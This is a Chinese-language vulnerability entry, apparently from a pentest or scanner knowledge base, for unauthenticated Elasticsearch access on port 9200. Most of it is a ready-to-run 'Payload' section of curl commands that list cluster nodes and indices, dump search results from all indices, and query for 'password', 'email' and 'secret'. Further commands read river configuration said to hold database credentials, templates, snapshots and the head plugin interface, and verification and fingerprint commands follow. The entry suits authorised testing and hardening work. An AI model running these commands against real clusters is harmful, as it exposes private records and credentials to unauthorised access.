---
id: ES-UNAUTH
title: Elasticsearch 未授权访问漏洞
product: elasticsearch
vendor: Elastic
version_affected: "all versions (misconfiguration)"
severity: HIGH
tags: [info_disclosure, 无需认证]
fingerprint: ["elasticsearch", "lucene_version", "You Know, for Search"]
---

## 漏洞描述

Elasticsearch 默认端口9200对外开放且无认证机制，攻击者可直接访问 REST API 读取所有索引数据、集群配置、节点信息等敏感内容。在未配置 X-Pack Security 或网络隔离的情况下，所有数据均可被未授权访问。

## 影响版本

- 所有未配置认证的 Elasticsearch 实例

## 前置条件

- 无需认证
- 目标 ES 端口可访问（默认9200）

## 利用步骤

1. 确认 ES 服务可访问
2. 枚举集群节点和索引信息
3. 搜索和下载敏感数据
4. 查看 ES web 管理界面（如安装了 head 插件）

## Payload

### 基本信息收集

```bash
# 确认服务在线 + 获取版本
curl -s http://target:9200/

# 集群健康状态
curl -s http://target:9200/_cluster/health?pretty

# 节点信息
curl -s http://target:9200/_nodes?pretty

# 列出所有索引
curl -s http://target:9200/_cat/indices?v
```

### 数据枚举

```bash
# 搜索所有索引的所有数据
curl -s "http://target:9200/_search?pretty&size=50"

# 搜索特定索引
curl -s "http://target:9200/INDEX_NAME/_search?pretty&size=50"

# 搜索包含关键词的数据（如密码、邮箱）
curl -s "http://target:9200/_search?pretty&q=password"
curl -s "http://target:9200/_search?pretty&q=email"
curl -s "http://target:9200/_search?pretty&q=secret"
```

### 敏感端点

```bash
# 查看 river 配置（可能包含数据库凭据）
curl -s "http://target:9200/_river/_search?pretty"

# 查看模板
curl -s "http://target:9200/_template?pretty"

# 查看快照仓库
curl -s "http://target:9200/_snapshot?pretty"

# Web 管理界面
curl -s http://target:9200/_plugin/head/
```

## 验证方法

```bash
# 确认未授权访问 — 返回版本和集群信息
curl -s http://target:9200/ | grep "cluster_name\|You Know, for Search"

# 确认可列出索引
curl -s http://target:9200/_cat/indices?v | head -5
```

## 指纹确认

```bash
curl -s http://target:9200/ | grep -i "You Know, for Search\|elasticsearch\|lucene_version"
```
